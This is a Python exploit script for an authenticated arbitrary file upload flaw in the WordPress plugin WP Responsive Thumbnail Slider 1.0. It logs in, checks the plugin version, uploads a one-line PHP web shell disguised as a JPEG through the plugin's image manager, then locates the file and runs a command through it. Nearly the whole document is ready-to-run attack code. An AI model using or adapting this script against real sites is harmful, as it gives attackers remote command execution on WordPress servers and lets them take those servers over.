# Payload: Authenticated Arbitraty File Upload
# Plugin: WP Responsive Thumbnail Slider
# Version: 1.0
# Reference: https://www.exploit-db.com/exploits/49933
# Author: RC
# Date: 2021-07-07
# Description: This script exploits an arbitrary file upload vulnerability in the WP Responsive Thumbnail Slider plugin (version 1.0) for WordPress. The exploit uploads a PHP payload to the target site and executes it to obtain a shell.


import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

class WPResponsiveThumbnailSliderExploit:
    def __init__(self, target_url, username, password):
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()

    def login(self):
        login_url = f"{self.target_url}/wp-login.php"
        data = {
            'log': self.username,
            'pwd': self.password,
            'wp-submit': 'Log In',
            'redirect_to': f"{self.target_url}/wp-admin/",
            'testcookie': '1'
        }
        response = self.session.post(login_url, data=data)
        if 'wp-admin' in response.url:
            print(f"Logged in as {self.username}")
            return True
        else:
            print("Login failed")
            return False

    def check_vulnerability(self):
        plugin_uri = f"{self.target_url}/wp-content/plugins/wp-responsive-thumbnail-slider/readme.txt"
        response = self.session.get(plugin_uri)
        if response.status_code == 200 and "Version: 1.0" in response.text:
            print("Vulnerable version detected.")
            return True
        else:
            print("Plugin is either not installed or not vulnerable.")
            return False

    def upload_payload(self):
        manage_uri = f"{self.target_url}/wp-admin/admin.php?page=responsive_thumbnail_slider_image_management"
        response = self.session.get(manage_uri)
        if "tmpl-uploader-window" not in response.text:
            print("Unable to access plugin management page.")
            return False

        payload = "<?php system($_GET['cmd']); ?>"
        file_name = "exploit.php"

        files = {
            'image_name': (file_name, payload, 'image/jpeg'),
            'imagetitle': (None, file_name.split('.')[0]),
            'btnsave': (None, 'Save Changes')
        }

        upload_uri = f"{manage_uri}&action=addedit"
        upload_response = self.session.post(upload_uri, files=files)
        if "New image added successfully" in upload_response.text:
            print("Payload uploaded successfully.")
            return True
        else:
            print("Failed to upload payload.")
            return False

    def execute_payload(self):
        files_url = f"{self.target_url}/wp-content/uploads/wp-responsive-images-thumbnail-slider/"
        response = self.session.get(files_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        payload_url = None

        for link in soup.find_all('a'):
            if link.get('href').endswith('.php'):
                payload_url = link.get('href')
                break

        if payload_url:
            full_url = f"{self.target_url}/{payload_url}?cmd=whoami"
            exec_response = self.session.get(full_url)
            print("Command output: ", exec_response.text)
        else:
            print("Failed to locate the uploaded payload.")

    def run(self):
        if self.login():
            if self.check_vulnerability():
                if self.upload_payload():
                    self.execute_payload()

if __name__ == "__main__":
    target_url = "http://example.com"  # URL objetive
    username = "admin"  # User WordPress
    password = "password"  # Pass WordPress

    exploit = WPResponsiveThumbnailSliderExploit(target_url, username, password)
    exploit.run()

